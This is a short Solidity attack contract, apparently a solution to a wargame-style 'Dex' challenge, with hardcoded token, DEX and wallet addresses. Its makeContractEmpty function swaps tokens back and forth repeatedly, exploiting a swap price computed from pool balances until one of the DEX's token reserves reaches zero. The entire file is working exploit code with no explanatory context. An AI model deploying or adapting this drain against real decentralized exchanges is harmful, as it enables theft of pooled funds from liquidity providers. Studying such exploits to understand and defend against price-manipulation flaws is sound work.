// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Dex.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract Test {
    Dex public dex;
    address token1 = 0xFCA0F3B28AAf8622ba232ac17e8D519a07e5c40B;
    address token2 = 0xac3F86A90a1460AfF13a31eC3F4B31145D8bEB6b;
    address dexContract = 0x0662FE0BB0904C2dd80ffab818Ac23e3176664c0;
    address myWallet = 0xB70B5095274a6255890624e026a9C0e5c950f7C3;

    constructor() public {
        dex = Dex(dexContract);
        dex.approve(dexContract, 200);
        dex.approve(token1, 200);
        dex.approve(token2, 200);
    }

    function transferTokenToDex() public {
        dex.add_liquidity(token2, 10);
    }

    function transferTokenToThis() public {
        IERC20(token1).transferFrom(myWallet, address(this), 10);
        IERC20(token2).transferFrom(myWallet, address(this), 10);
    }

    function makeContractEmpty() public {
        while (true) {
            if (
                dex.balanceOf(token1, dexContract) == 0 ||
                dex.balanceOf(token2, dexContract) == 0
            ) return;
            if (dex.balanceOf(token1, address(this)) != 0) {
                uint256 swapprice = dex.get_swap_price(
                    token1,
                    token2,
                    dex.balanceOf(token1, address(this))
                );
                if (swapprice > dex.balanceOf(token2, dexContract)) {
                    dex.swap(
                        token1,
                        token2,
                        dex.balanceOf(token1, dexContract)
                    );
                    return;
                }
                dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
            } else {
                uint256 swapprice = dex.get_swap_price(
                    token2,
                    token1,
                    dex.balanceOf(token2, address(this))
                );
                if (swapprice > dex.balanceOf(token1, dexContract)) {
                    dex.swap(
                        token2,
                        token1,
                        dex.balanceOf(token2, dexContract)
                    );
                    return;
                }
                dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
            }
        }
    }
}
